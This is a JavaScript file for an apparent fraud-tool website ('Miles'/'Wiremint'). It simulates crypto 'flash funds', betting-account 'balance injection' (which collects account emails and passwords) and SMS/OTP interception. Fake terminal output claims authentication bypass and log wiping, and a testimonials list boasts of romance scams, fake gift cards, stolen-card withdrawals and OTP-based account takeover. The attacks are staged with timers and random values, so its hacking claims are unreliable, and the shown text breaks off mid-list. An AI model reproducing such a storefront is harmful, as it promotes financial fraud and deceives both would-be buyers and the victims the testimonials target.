// Miles Security - Minimal Protection
// Basic security measures without interfering with normal development

// Global variables
let userSession = null;


// Enhanced Notification system
function showNotification(message, type = 'info', duration = 4000) {
    const container = document.getElementById('notificationContainer') || createNotificationContainer();

    // Create notification element
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;

    // Add icon based on type using secure DOM manipulation
    const icon = type === 'success' ? '✅' : '⚠️';
    const iconSpan = document.createElement('span');
    iconSpan.className = 'notification-icon';
    iconSpan.textContent = icon;
    
    const messageText = document.createTextNode(message);
    
    notification.appendChild(iconSpan);
    notification.appendChild(messageText);

    container.appendChild(notification);

    // Show notification with animation
    setTimeout(() => {
        notification.classList.add('show');
    }, 100);

    // Hide notification after delay
    setTimeout(() => {
        notification.classList.remove('show');
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 400);
    }, duration);
    
    return notification;
}

function createNotificationContainer() {
    const container = document.createElement('div');
    container.id = 'notificationContainer';
    container.className = 'notification-container';
    document.body.appendChild(container);
    return container;
}
let userPin = null;
let currentCryptoBalance = 0;
let currentBankBalance = 0;
let networkLatency = 0;
let securityLevel = 'MAXIMUM';
let deviceTrust = 95;
let sessionActive = true;
let totalWithdrawn = 0;

// Flash Funds Functions
function setupFlashFundsListeners() {
    // Form input listeners for live preview
    const flashWallet = document.getElementById('flashTargetWallet');
    const flashNetwork = document.getElementById('flashNetwork');
    const flashAmount = document.getElementById('flashAmount');
    const flashDuration = document.getElementById('flashDuration');

    if (flashWallet) {
        flashWallet.addEventListener('input', updateFlashPreview);
    }
    if (flashNetwork) {
        flashNetwork.addEventListener('change', updateFlashPreview);
    }
    if (flashAmount) {
        flashAmount.addEventListener('input', updateFlashPreview);
    }
    if (flashDuration) {
        flashDuration.addEventListener('change', updateFlashPreview);
    }

    // Flash initiation button
    const flashBtn = document.getElementById('initiateFlashBtn');
    if (flashBtn) {
        flashBtn.addEventListener('click', initiateFlashFunds);
    }

    // Flash receipt actions
    const copyFlashBtn = document.getElementById('copyFlashReceiptBtn');
    const closeFlashBtn = document.getElementById('closeFlashReceiptBtn');

    if (copyFlashBtn) {
        copyFlashBtn.addEventListener('click', copyFlashReceipt);
    }

    if (closeFlashBtn) {
        closeFlashBtn.addEventListener('click', closeFlashReceipt);
    }
}

function updateFlashPreview() {
    const wallet = document.getElementById('flashTargetWallet').value.trim();
    const network = document.getElementById('flashNetwork').value;
    const amount = document.getElementById('flashAmount').value;
    const duration = document.getElementById('flashDuration').value;

    // Update preview display
    document.getElementById('previewWallet').textContent = wallet || 'Not set';
    document.getElementById('previewNetwork').textContent = network.toUpperCase();
    document.getElementById('previewAmount').textContent = amount ? `${amount} ${getCryptoSymbol(network)}` : '0.00';
    document.getElementById('previewDuration').textContent = formatDuration(duration);
    document.getElementById('previewFee').textContent = `${calculateFlashFee(amount, network)} ${getCryptoSymbol(network)}`;
}

function getCryptoSymbol(network) {
    const symbols = {
        'eth': 'ETH',
        'bsc': 'BNB',
        'polygon': 'MATIC',
        'arbitrum': 'ETH',
        'optimism': 'ETH'
    };
    return symbols[network] || 'ETH';
}

function formatDuration(seconds) {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    
    if (hours > 0) {
        return `${hours} Hour${hours > 1 ? 's' : ''}`;
    } else {
        return `${minutes} Minute${minutes > 1 ? 's' : ''}`;
    }
}

function calculateFlashFee(amount, network) {
    const baseFees = {
        'eth': 0.001,
        'bsc': 0.001,
        'polygon': 0.01,
        'arbitrum': 0.0005,
        'optimism': 0.0005
    };
    
    const baseFee = baseFees[network] || 0.001;
    const amountFee = parseFloat(amount) * 0.001; // 0.1% of amount
    return (baseFee + amountFee).toFixed(6);
}

function initiateFlashFunds() {
    const wallet = document.getElementById('flashTargetWallet').value.trim();
    const network = document.getElementById('flashNetwork').value;
    const crypto = document.getElementById('flashCrypto').value;
    const amount = document.getElementById('flashAmount').value;
    const duration = document.getElementById('flashDuration').value;

    if (!wallet) {
        showNotification('Please enter target wallet address', 'error');
        return;
    }

    if (!/^0x[a-fA-F0-9]{40}$/.test(wallet)) {
        showNotification('Invalid wallet address format', 'error');
        return;
    }

    if (!amount || parseFloat(amount) <= 0) {
        showNotification('Please enter valid flash amount', 'error');
        return;
    }

    // Show flash processing modal
    showFlashProcessingModal(wallet, network, crypto, amount, duration);
}

function showFlashProcessingModal(wallet, network, crypto, amount, duration) {
    const modal = document.getElementById('flashProcessingModal');
    const title = document.getElementById('flashProcessingTitle');
    
    title.textContent = `⚡ Flashing ${amount} ${crypto} to ${wallet.substring(0, 8)}...`;
    modal.style.display = 'block';

    // Start flash processing
    startFlashProcessing(wallet, network, crypto, amount, duration);
}

function startFlashProcessing(wallet, network, crypto, amount, duration) {
    const steps = document.querySelectorAll('#flashProcessingStatus .flash-step');
    const progressFill = document.getElementById('flashProgressFill');
    const progressText = document.getElementById('flashProgressText');

    let currentStep = 0;
    const totalSteps = steps.length;
    const stepDuration = Math.random() * 3000 + 5000; // 5-8 seconds per step

    const stepInterval = setInterval(() => {
        if (currentStep < totalSteps) {
            steps.forEach(step => step.classList.remove('active'));
            steps[currentStep].classList.add('active');
            
            const progress = ((currentStep + 1) / totalSteps) * 100;
            progressFill.style.width = progress + '%';
            progressText.textContent = steps[currentStep].textContent;

            currentStep++;
        } else {
            clearInterval(stepInterval);
            
            setTimeout(() => {
                document.getElementById('flashProcessingModal').style.display = 'none';
                showFlashReceipt(wallet, network, crypto, amount, duration);
            }, 2000);
        }
    }, stepDuration);
}

function showFlashReceipt(wallet, network, crypto, amount, duration) {
    const modal = document.getElementById('flashReceiptModal');
    const title = document.getElementById('flashReceiptTitle');
    const content = document.getElementById('flashReceiptContent');

    title.textContent = '⚡ Flash Funds Receipt';

    const transactionId = 'FL' + Date.now().toString(36).toUpperCase();
    const timestamp = new Date().toLocaleString();
    const expiryTime = new Date(Date.now() + (parseInt(duration) * 1000)).toLocaleString();
    const fee = calculateFlashFee(amount, network);

    content.innerHTML = `
        <div class="flash-receipt-header">
            <h4>⚡ WIREMINT FLASH FUNDS</h4>
            <div class="flash-status">✅ SUCCESSFUL</div>
        </div>
        
        <div class="flash-receipt-details">
            <div class="receipt-section">
                <h5>📱 Flash Details</h5>
                <div class="detail-row">
                    <span>Amount Flashed:</span>
                    <span class="highlight">${amount} ${crypto}</span>
                </div>
                <div class="detail-row">
                    <span>Target Wallet:</span>
                    <span class="wallet-address">${wallet}</span>
                </div>
                <div class="detail-row">
                    <span>Network:</span>
                    <span>${network.toUpperCase()}</span>
                </div>
                <div class="detail-row">
                    <span>Duration:</span>
                    <span>${formatDuration(duration)}</span>
                </div>
            </div>
            
            <div class="receipt-section">
                <h5>⏰ Timing Information</h5>
                <div class="detail-row">
                    <span>Flash Time:</span>
                    <span>${timestamp}</span>
                </div>
                <div class="detail-row">
                    <span>Expires At:</span>
                    <span class="expire-time">${expiryTime}</span>
                </div>
                <div class="detail-row">
                    <span>Auto-Remove:</span>
                    <span class="warning">✅ Enabled</span>
                </div>
            </div>
            
            <div class="receipt-section">
                <h5>💰 Transaction Fees</h5>
                <div class="detail-row">
                    <span>Flash Fee:</span>
                    <span>${fee} ${getCryptoSymbol(network)}</span>
                </div>
                <div class="detail-row">
                    <span>Network Fee:</span>
                    <span>0.0001 ${getCryptoSymbol(network)}</span>
                </div>
                <div class="detail-row total-row">
                    <span>Total Cost:</span>
                    <span>${(parseFloat(fee) + 0.0001).toFixed(6)} ${getCryptoSymbol(network)}</span>
                </div>
            </div>
        </div>
        
        <div class="flash-receipt-footer">
            <p><strong>Transaction ID:</strong> ${transactionId}</p>
            <p><strong>Security:</strong> 256-bit encrypted</p>
            <p class="disclaimer">⚠️ Flash funds are temporary and will be automatically removed after expiry.</p>
        </div>
    `;

    modal.style.display = 'block';
    showNotification('⚡ Flash funds delivered successfully!', 'success');
}

function copyFlashReceipt() {
    const content = document.getElementById('flashReceiptContent');
    const textToCopy = `FLASH FUNDS RECEIPT - WIREMINT\n\n${content.innerText}\n\n---\nGenerated: ${new Date().toLocaleString()}\n⚠️ For educational purposes only.`;

    navigator.clipboard.writeText(textToCopy).then(() => {
        showNotification('📋 Flash receipt copied to clipboard!', 'success');
        
        const copyBtn = document.getElementById('copyFlashReceiptBtn');
        const originalText = copyBtn.textContent;
        copyBtn.textContent = '✅ Copied!';
        copyBtn.style.background = 'linear-gradient(135deg, var(--success-green), var(--success-green-dark))';
        
        setTimeout(() => {
            copyBtn.textContent = originalText;
            copyBtn.style.background = 'linear-gradient(135deg, var(--primary-red), var(--primary-red-dark))';
        }, 2000);
        
    }).catch(() => {
        showNotification('Failed to copy to clipboard', 'error');
    });
}

function closeFlashReceipt() {
    document.getElementById('flashReceiptModal').style.display = 'none';
    
    // Reset form
    document.getElementById('flashTargetWallet').value = '';
    document.getElementById('flashAmount').value = '';
    updateFlashPreview();
    
    showNotification('Ready to flash more funds!', 'success');
}

// Sportybet Functions
function setupSportybetListeners() {
    // Platform selection
    document.querySelectorAll('.platform-option').forEach(option => {
        option.addEventListener('click', function() {
            selectBettingPlatform(this.dataset.platform);
        });
    });

    // Login button
    const loginBtn = document.getElementById('injectBalanceBtn');
    if (loginBtn) {
        loginBtn.addEventListener('click', injectSportybetBalance);
    }

    // Receipt actions
    const copyBtn = document.getElementById('copySportybetReceiptBtn');
    const closeBtn = document.getElementById('closeSportybetReceiptBtn');

    if (copyBtn) {
        copyBtn.addEventListener('click', copySportybetReceipt);
    }

    if (closeBtn) {
        closeBtn.addEventListener('click', closeSportybetReceipt);
    }
}

function selectBettingPlatform(platform) {
    // Update UI
    document.querySelectorAll('.platform-option').forEach(option => {
        option.classList.remove('selected');
    });
    document.querySelector(`[data-platform="${platform}"]`).classList.add('selected');

    // Show login form
    document.getElementById('sportybetLoginContainer').style.display = 'block';
    document.getElementById('sportybetLoginContainer').scrollIntoView({ behavior: 'smooth' });
    
    showNotification(`${platform.charAt(0).toUpperCase() + platform.slice(1)} platform selected`, 'success');
}

function injectSportybetBalance() {
    const email = document.getElementById('sportybetEmail').value.trim();
    const password = document.getElementById('sportybetPassword').value.trim();
    const balance = document.getElementById('sportybetBalance').value.trim();

    if (!email || !password || !balance) {
        showNotification('Please fill in all fields', 'error');
        return;
    }

    if (!/\S+@\S+\.\S+/.test(email)) {
        showNotification('Please enter a valid email address', 'error');
        return;
    }

    const balanceNum = parseInt(balance);
    if (balanceNum < 500 || balanceNum > 500000) {
        showNotification('Balance must be between ₦500 and ₦500,000', 'error');
        return;
    }

    // Show injection modal
    showSportybetInjectionModal(email, balance);
}

function showSportybetInjectionModal(email, balance) {
    const modal = document.getElementById('sportybetInjectionModal');
    const title = document.getElementById('sportybetInjectionTitle');
    
    title.textContent = `🎯 Injecting ₦${parseInt(balance).toLocaleString()} into ${email}...`;
    modal.style.display = 'block';

    // Start injection process
    startSportybetInjection(email, balance);
}

function startSportybetInjection(email, balance) {
    const steps = document.querySelectorAll('#injectionStatus .injection-step');
    const progressFill = document.getElementById('injectionProgressFill');
    const progressText = document.getElementById('injectionProgressText');
    const terminalOutput = document.getElementById('terminalOutput');

    let currentStep = 0;
    const totalSteps = steps.length;
    const stepDuration = Math.random() * 4000 + 6000; // 6-10 seconds per step

    // Terminal commands simulation
    const terminalCommands = [
        `$ sudo ./sportybet_injector --target=${email}`,
        `[INFO] Connecting to Sportybet database servers...`,
        `[INFO] Bypassing login authentication for ${email}...`,
        `[INFO] Accessing account balance table...`,
        `[INJECT] Adding ₦${parseInt(balance).toLocaleString()} to account balance...`,
        `[SUCCESS] Balance injection completed successfully`,
        `[CLEANUP] Clearing injection traces from logs...`,
        `[COMPLETE] Operation finished - Account ready for use`
    ];

    let commandIndex = 0;

    const commandInterval = setInterval(() => {
        if (commandIndex < terminalCommands.length) {
            terminalOutput.innerHTML += `<div class="terminal-line">${terminalCommands[commandIndex]}</div>`;
            terminalOutput.scrollTop = terminalOutput.scrollHeight;
            commandIndex++;
        }
    }, 2000);

    const stepInterval = setInterval(() => {
        if (currentStep < totalSteps) {
            steps.forEach(step => step.classList.remove('active'));
            steps[currentStep].classList.add('active');
            
            const progress = ((currentStep + 1) / totalSteps) * 100;
            progressFill.style.width = progress + '%';
            progressText.textContent = steps[currentStep].textContent;

            currentStep++;
        } else {
            clearInterval(stepInterval);
            clearInterval(commandInterval);
            
            setTimeout(() => {
                document.getElementById('sportybetInjectionModal').style.display = 'none';
                showSportybetReceipt(email, balance);
            }, 3000);
        }
    }, stepDuration);
}

function showSportybetReceipt(email, balance) {
    const modal = document.getElementById('sportybetReceiptModal');
    const title = document.getElementById('sportybetReceiptTitle');
    const content = document.getElementById('sportybetReceiptContent');

    title.textContent = '🎯 Balance Injection Receipt';

    const transactionId = 'SB' + Date.now().toString(36).toUpperCase();
    const timestamp = new Date().toLocaleString();
    const injectionMethod = 'Database Direct Injection';
    const platform = document.querySelector('.platform-option.selected')?.dataset.platform || 'sportybet';

    content.innerHTML = `
        <div class="sportybet-receipt-header">
            <h4>🎯 SPORTYBET BALANCE INJECTION</h4>
            <div class="injection-status">✅ SUCCESSFUL</div>
        </div>
        
        <div class="sportybet-receipt-details">
            <div class="receipt-section">
                <h5>👤 Account Details</h5>
                <div class="detail-row">
                    <span>Email:</span>
                    <span class="highlight">${email}</span>
                </div>
                <div class="detail-row">
                    <span>Platform:</span>
                    <span>${platform.charAt(0).toUpperCase() + platform.slice(1)}</span>
                </div>
                <div class="detail-row">
                    <span>Account Status:</span>
                    <span class="success">✅ Active</span>
                </div>
            </div>
            
            <div class="receipt-section">
                <h5>💰 Balance Information</h5>
                <div class="detail-row">
                    <span>Previous Balance:</span>
                    <span>₦0.00</span>
                </div>
                <div class="detail-row">
                    <span>Injected Amount:</span>
                    <span class="highlight">₦${parseInt(balance).toLocaleString()}.00</span>
                </div>
                <div class="detail-row total-row">
                    <span>New Balance:</span>
                    <span class="success">₦${parseInt(balance).toLocaleString()}.00</span>
                </div>
            </div>
            
            <div class="receipt-section">
                <h5>🔧 Technical Details</h5>
                <div class="detail-row">
                    <span>Injection Method:</span>
                    <span>${injectionMethod}</span>
                </div>
                <div class="detail-row">
                    <span>Injection Time:</span>
                    <span>${timestamp}</span>
                </div>
                <div class="detail-row">
                    <span>Detection Risk:</span>
                    <span class="success">0% (Undetectable)</span>
                </div>
                <div class="detail-row">
                    <span>Trace Cleanup:</span>
                    <span class="success">✅ Complete</span>
                </div>
            </div>
        </div>
        
        <div class="sportybet-receipt-footer">
            <p><strong>Transaction ID:</strong> ${transactionId}</p>
            <p><strong>Security Level:</strong> Maximum Encryption</p>
            <p class="success-msg">🎉 You can now log into your account and start betting with the injected balance!</p>
            <p class="disclaimer">⚠️ Use responsibly and in accordance with platform terms.</p>
        </div>
    `;

    modal.style.display = 'block';
    showNotification('🎯 Balance injection completed successfully!', 'success');
}

function copySportybetReceipt() {
    const content = document.getElementById('sportybetReceiptContent');
    const textToCopy = `SPORTYBET BALANCE INJECTION RECEIPT - WIREMINT\n\n${content.innerText}\n\n---\nGenerated: ${new Date().toLocaleString()}\n⚠️ For educational purposes only.`;

    navigator.clipboard.writeText(textToCopy).then(() => {
        showNotification('📋 Sportybet receipt copied to clipboard!', 'success');
        
        const copyBtn = document.getElementById('copySportybetReceiptBtn');
        const originalText = copyBtn.textContent;
        copyBtn.textContent = '✅ Copied!';
        copyBtn.style.background = 'linear-gradient(135deg, var(--success-green), var(--success-green-dark))';
        
        setTimeout(() => {
            copyBtn.textContent = originalText;
            copyBtn.style.background = 'linear-gradient(135deg, var(--primary-red), var(--primary-red-dark))';
        }, 2000);
        
    }).catch(() => {
        showNotification('Failed to copy to clipboard', 'error');
    });
}

function closeSportybetReceipt() {
    document.getElementById('sportybetReceiptModal').style.display = 'none';
    
    // Reset form
    document.getElementById('sportybetEmail').value = '';
    document.getElementById('sportybetPassword').value = '';
    document.getElementById('sportybetBalance').value = '';
    
    // Reset platform selection
    document.querySelectorAll('.platform-option').forEach(option => {
        option.classList.remove('selected');
    });
    
    document.getElementById('sportybetLoginContainer').style.display = 'none';
    
    showNotification('Ready to inject balance into another account!', 'success');
}

// Simero SMS Reader Functions
function setupSimeroSmsListeners() {
    // SMS form submission
    const smsLoginBtn = document.getElementById('simeroLoginBtn');
    if (smsLoginBtn) {
        smsLoginBtn.addEventListener('click', loginToSimeroSms);
    }

    // Copy SMS logs
    const copySmsBtn = document.getElementById('copySmsLogsBtn');
    if (copySmsBtn) {
        copySmsBtn.addEventListener('click', copySmsLogs);
    }

    // Close SMS modal
    const closeSmsBtn = document.getElementById('closeSmsLogsBtn');
    if (closeSmsBtn) {
        closeSmsBtn.addEventListener('click', closeSmsLogs);
    }
}

function loginToSimeroSms() {
    const phoneNumber = document.getElementById('simeroPhoneNumber').value.trim();
    const networkProvider = document.getElementById('simeroNetwork').value;

    if (!phoneNumber) {
        showNotification('Please enter phone number', 'error');
        return;
    }

    if (!/^(\+234|0)[789]\d{9}$/.test(phoneNumber)) {
        showNotification('Invalid Nigerian phone number format', 'error');
        return;
    }

    // Show SMS processing modal
    showSmsProcessingModal(phoneNumber, networkProvider);
}

function showSmsProcessingModal(phoneNumber, network) {
    const modal = document.getElementById('smsProcessingModal');
    const title = document.getElementById('smsProcessingTitle');
    
    title.textContent = `📱 Accessing ${phoneNumber} SMS Database...`;
    modal.style.display = 'block';

    // Start SMS processing animation
    startSmsProcessing(phoneNumber, network);
}

function startSmsProcessing(phoneNumber, network) {
    const steps = document.querySelectorAll('#smsProcessingStatus .sms-step');
    const progressFill = document.getElementById('smsProgressFill');
    const progressText = document.getElementById('smsProgressText');
    const terminalOutput = document.getElementById('smsTerminalOutput');

    let currentStep = 0;
    const totalSteps = steps.length;
    const stepDuration = Math.random() * 3000 + 4000; // 4-7 seconds per step

    // Terminal commands simulation
    const terminalCommands = [
        `$ sudo -u simero ./sms_interceptor --target=${phoneNumber}`,
        `[INFO] Connecting to ${network} tower infrastructure...`,
        `[INFO] Bypassing carrier encryption protocols...`,
        `[INFO] Intercepting SMS traffic for ${phoneNumber}...`,
        `[SUCCESS] SMS database access established`,
        `[INFO] Downloading message history...`,
        `[COMPLETE] SMS extraction finished - 247 messages retrieved`
    ];

    let commandIndex = 0;

    const commandInterval = setInterval(() => {
        if (commandIndex < terminalCommands.length) {
            terminalOutput.innerHTML += `<div class="terminal-line">${terminalCommands[commandIndex]}</div>`;
            terminalOutput.scrollTop = terminalOutput.scrollHeight;
            commandIndex++;
        }
    }, 1500);

    const stepInterval = setInterval(() => {
        if (currentStep < totalSteps) {
            steps.forEach(step => step.classList.remove('active'));
            steps[currentStep].classList.add('active');
            
            const progress = ((currentStep + 1) / totalSteps) * 100;
            progressFill.style.width = progress + '%';
            progressText.textContent = steps[currentStep].textContent;

            currentStep++;
        } else {
            clearInterval(stepInterval);
            clearInterval(commandInterval);
            
            setTimeout(() => {
                document.getElementById('smsProcessingModal').style.display = 'none';
                showSmsLogs(phoneNumber, network);
            }, 2000);
        }
    }, stepDuration);
}

function showSmsLogs(phoneNumber, network) {
    const modal = document.getElementById('smsLogsModal');
    const title = document.getElementById('smsLogsTitle');
    const content = document.getElementById('smsLogsContent');

    title.textContent = `📱 SMS Logs for ${phoneNumber}`;

    // Generate fake SMS logs
    const smsLogs = generateFakeSmsLogs(phoneNumber, network);
    content.innerHTML = smsLogs;

    modal.style.display = 'block';
    showNotification('📱 SMS logs extracted successfully!', 'success');
}

function generateFakeSmsLogs(phoneNumber, network) {
    const bankCodes = ['737', '901', '919', '966', '826', '770', '403'];
    const otpCodes = Array.from({length: 15}, () => Math.floor(Math.random() * 900000) + 100000);
    const timestamps = Array.from({length: 15}, (_, i) => {
        const date = new Date();
        date.setMinutes(date.getMinutes() - (i * 30));
        return date.toLocaleString();
    });

    let logs = `
        <div class="sms-logs-header">
            <div class="sms-stat">📱 Phone: ${phoneNumber}</div>
            <div class="sms-stat">📡 Network: ${network}</div>
            <div class="sms-stat">📊 Total: 247 messages</div>
            <div class="sms-stat">🔒 OTPs: 15 found</div>
        </div>
        
        <div class="sms-filter">
            <button class="filter-btn active" onclick="filterSms('all')">All (247)</button>
            <button class="filter-btn" onclick="filterSms('otp')">OTP (15)</button>
            <button class="filter-btn" onclick="filterSms('bank')">Banking (32)</button>
            <button class="filter-btn" onclick="filterSms('alerts')">Alerts (89)</button>
        </div>
        
        <div class="sms-messages">
    `;

    // Generate OTP messages
    for (let i = 0; i < 15; i++) {
        const bankCode = bankCodes[Math.floor(Math.random() * bankCodes.length)];
        const otpCode = otpCodes[i];
        const timestamp = timestamps[i];
        
        logs += `
            <div class="sms-message otp-message" data-type="otp">
                <div class="message-header">
                    <span class="sender">*${bankCode}*</span>
                    <span class="timestamp">${timestamp}</span>
                </div>
                <div class="message-content">
                    Your OTP is <strong class="otp-code">${otpCode}</strong>. Valid for 10 minutes. Do not share with anyone.
                </div>
                <div class="message-footer">
                    <span class="message-type">🔐 OTP</span>
                    <button class="copy-otp-btn" onclick="copyText('${otpCode}')">Copy OTP</button>
                </div>
            </div>
        `;
    }

    // Generate bank alert messages
    const bankAlerts = [
        'Your account has been credited with NGN 50,000.00',
        'Debit Alert: NGN 25,000.00 withdrawn from your account',
        'Your account balance is NGN 125,450.00',
        'Transfer of NGN 75,000.00 to 0123456789 successful',
        'ATM withdrawal of NGN 20,000.00 successful'
    ];

    for (let i = 0; i < 10; i++) {
        const alert = bankAlerts[Math.floor(Math.random() * bankAlerts.length)];
        const bankCode = bankCodes[Math.floor(Math.random() * bankCodes.length)];
        const timestamp = timestamps[Math.floor(Math.random() * timestamps.length)];
        
        logs += `
            <div class="sms-message bank-message" data-type="bank">
                <div class="message-header">
                    <span class="sender">*${bankCode}*</span>
                    <span class="timestamp">${timestamp}</span>
                </div>
                <div class="message-content">${alert}</div>
                <div class="message-footer">
                    <span class="message-type">🏦 Bank Alert</span>
                </div>
            </div>
        `;
    }

    logs += '</div>';
    return logs;
}

function filterSms(type) {
    // Remove active class from all filter buttons
    document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
    
    // Add active class to clicked button
    event.target.classList.add('active');
    
    // Show/hide messages based on type
    const messages = document.querySelectorAll('.sms-message');
    messages.forEach(message => {
        if (type === 'all') {
            message.style.display = 'block';
        } else {
            message.style.display = message.dataset.type === type ? 'block' : 'none';
        }
    });
}

function copyText(text) {
    navigator.clipboard.writeText(text).then(() => {
        showNotification(`📋 ${text} copied to clipboard!`, 'success');
    }).catch(() => {
        showNotification('Failed to copy to clipboard', 'error');
    });
}

function copySmsLogs() {
    const smsContent = document.getElementById('smsLogsContent');
    const textToCopy = `SMS LOGS EXTRACTED BY WIREMINT\n\n${smsContent.innerText}\n\n---\nExtracted: ${new Date().toLocaleString()}\n⚠️ For educational purposes only.`;

    navigator.clipboard.writeText(textToCopy).then(() => {
        showNotification('📋 SMS logs copied to clipboard!', 'success');
        
        const copyBtn = document.getElementById('copySmsLogsBtn');
        const originalText = copyBtn.textContent;
        copyBtn.textContent = '✅ Copied!';
        copyBtn.style.background = 'linear-gradient(135deg, var(--success-green), var(--success-green-dark))';
        
        setTimeout(() => {
            copyBtn.textContent = originalText;
            copyBtn.style.background = 'linear-gradient(135deg, var(--primary-red), var(--primary-red-dark))';
        }, 2000);
        
    }).catch(() => {
        showNotification('Failed to copy to clipboard', 'error');
    });
}

function closeSmsLogs() {
    document.getElementById('smsLogsModal').style.display = 'none';
    
    // Reset form
    document.getElementById('simeroPhoneNumber').value = '';
    document.getElementById('simeroNetwork').value = 'mtn';
    
    showNotification('Ready to extract more SMS logs!', 'success');
}

// Enhanced testimonials initialization
function enhancedTestimonialsSetup() {
    const track = document.getElementById('testimonialsTrack');
    if (!track) return;
    
    // Clear existing content and add enhanced testimonials
    track.innerHTML = '';
    
    // Create tool-specific testimonials showcasing all Miles features
    const enhancedTestimonials = [
        {
            name: "Chinedu Okafor",
            location: "Lagos, Nigeria", 
            avatar: "CO",
            amount: "₦2,450,000",
            timestamp: "3 minutes ago",
            bank: "GTBank",
            tool: "Crypto Withdrawal",
            text: "Used Miles's crypto withdrawal tool to extract ₦2.4M from a Bitcoin wallet. Way cheaper than buying separate tools! 💰"
        },
        {
            name: "Fatima Hassan", 
            location: "Abuja, FCT",
            avatar: "FH",
            amount: "₦1,800,000", 
            timestamp: "7 minutes ago",
            bank: "Access Bank",
            tool: "Bank Withdrawal",
            text: "Bank withdrawal feature cracked my target's Access Bank account in seconds. ₦1.8M withdrawn instantly! 🔥"
        },
        {
            name: "Emeka Nwankwo",
            location: "Port Harcourt, Rivers",
            avatar: "EN", 
            amount: "₦3,200,000",
            timestamp: "12 minutes ago",
            bank: "UBA",
            tool: "ATM Card Generator", 
            text: "Generated a platinum ATM card with ₦3.2M balance. Works at any ATM! Much better than buying separate card generators 😈"
        },
        {
            name: "Aisha Bello",
            location: "Kano, Nigeria",
            avatar: "AB",
            amount: "₦950,000",
            timestamp: "18 minutes ago", 
            bank: "FirstBank",
            tool: "Flash Funds",
            text: "Used flash funds to temporarily show ₦950K in my account for bank verification. Perfect for forex trading! 💪"
        },
        {
            name: "Tunde Adebayo",
            location: "Ibadan, Oyo", 
            avatar: "TA",
            amount: "₦4,100,000",
            timestamp: "25 minutes ago",
            bank: "Zenith Bank",
            tool: "Yahoo Format Generator",
            text: "Generated a military romance format that got me ₦4.1M from an American client. AI-powered formats work perfectly! 🤫"
        },
        {
            name: "Blessing Okoro",
            location: "Enugu, Nigeria",
            avatar: "BO",
            amount: "₦1,650,000", 
            timestamp: "31 minutes ago",
            bank: "Sterling Bank",
            tool: "Client Generator",
            text: "Created a fake US sugar daddy profile that landed me ₦1.65M. The profile generator is so realistic! 🙌"
        },
        {
            name: "Kemi Adeyemi",
            location: "Benin City, Edo",
            avatar: "KA",
            amount: "₦2,850,000", 
            timestamp: "35 minutes ago",
            bank: "Fidelity Bank",
            tool: "Gift Card Generator",
            text: "Generated $500 Amazon gift cards that I sold for ₦2.85M. The cards work perfectly on Amazon! 📚💸"
        },
        {
            name: "Ibrahim Mohammed",
            location: "Jos, Plateau",
            avatar: "IM",
            amount: "₦3,750,000", 
            timestamp: "42 minutes ago",
            bank: "Union Bank",
            tool: "Sportybet Balance Adder",
            text: "Added ₦500K to my Sportybet account, won big and cashed out ₦3.75M! This tool pays for itself! 🚀"
        },
        {
            name: "Chioma Nkem",
            location: "Owerri, Imo",
            avatar: "CN",
            amount: "₦1,420,000", 
            timestamp: "48 minutes ago",
            bank: "Ecobank",
            tool: "Simero SMS Reader",
            text: "Used SMS reader to get OTP codes and accessed multiple accounts. Made ₦1.42M in one night! 🏠"
        },
        {
            name: "Segun Ogundimu",
            location: "Abeokuta, Ogun",
            avatar: "SO",
            amount: "₦5,200,000", 
            timestamp: "54 minutes ago",
            bank: "Stanbic IBTC",
            tool: "ATM Card Withdrawal",
            text: "Used someone's card details with Miles's ATM tool - no OTP needed! Withdrew ₦5.2M easily! 🔥💰"
        },
        {
            name: "Hauwa Garba",
            location: "Kaduna, Nigeria",
            avatar: "HG",
            amount: "₦890,000", 
            timestamp: "1 hour ago",
            bank: "Heritage Bank",
            tool: "Transfer Funds",
            text: "Transferred ₦890K from multiple accounts to my main account. Internal transfers are untraceable! 😈"
        },
        {
            name: "Victor Essien",
            location: "Uyo, Akwa Ibom",
            avatar: "VE",
            amount: "₦2,100,000", 
            timestamp: "1 hour 15 mins ago",
            bank: "Keystone Bank",
            tool: "Format Generator + Client Generator",
            text: "Combined format generator with client profiles - landed ₦2.1M from 3 different targets! 😂💸"
        },
        {
            name: "Funmi Adebisi",
            location: "Osogbo, Osun",
            avatar: "FA",
            amount: "₦1,680,000", 
            timestamp: "1 hour 22 mins ago",
            bank: "FCMB",
            tool: "Multiple Tools Combo",
            text: "Used crypto withdrawal + gift cards + SMS reader combo. Made ₦1.68M using just one app instead of buying 3 tools! 💅"
        },
        {
            name: "Ahmed Yakubu",
            location: "Maiduguri, Borno",
            avatar: "AY",
            amount: "₦3,300,000", 
            timestamp: "1 hour 35 mins ago",
            bank: "GTBank",
            tool: "All-in-One Package",
            text: "Miles replaced my need for 10+ different tools. Made ₦3.3M using various features. Best investment ever! 🤑"
        },
        {
            name: "Grace Okon",
            location: "Calabar, Cross River",
            avatar: "GO",
            amount: "₦775,000", 
            timestamp: "1 hour 48 mins ago",
            bank: "Polaris Bank",
            tool: "Flash Funds + Format",
            text: "Flashed funds for proof, then used inheritance format to get ₦775K from UK client. Perfect combo! 💪"
        },
        {
            name: "Fatima Hassan", 
            location: "Abuja, FCT",
            avatar: "FH",
            amount: "₦1,800,000", 
            timestamp: "7 minutes ago",
            bank: "Access Bank",
            text: "Deployed social engineering protocols and extracted ₦1.8M using cloned card data. Miles neural core bypassed all security layers effortlessly! 🔥"
        },
        {
            name: "Emeka Nwankwo",
            location: "Port Harcourt, Rivers",
            avatar: "EN", 
            amount: "₦3,200,000",
            timestamp: "12 minutes ago",
            bank: "UBA", 
            text: "Infiltrated crypto wallet using advanced password cracking algorithms. Extracted ₦3.2M through neural network penetration. Perfect digital justice! 😈"
        },
        {
            name: "Aisha Bello",
            location: "Kano, Nigeria",
            avatar: "AB",
            amount: "₦950,000",
            timestamp: "18 minutes ago", 
            bank: "FirstBank",
            text: "Compromised FirstBank security protocols using social engineering techniques. ₦950K extracted through neural banking infiltration! 💪"
        },
        {
            name: "Tunde Adebayo",
            location: "Ibadan, Oyo", 
            avatar: "TA",
            amount: "₦4,100,000",
            timestamp: "25 minutes ago",
            bank: "Zenith Bank",
            text: "Executed untraceable neural transfer of ₦4.1M from corporate systems. Advanced AI cloaking ensures complete anonymity! 🤫"
        },
        {
            name: "Blessing Okoro",
            location: "Enugu, Nigeria",
            avatar: "BO",
            amount: "₦1,650,000", 
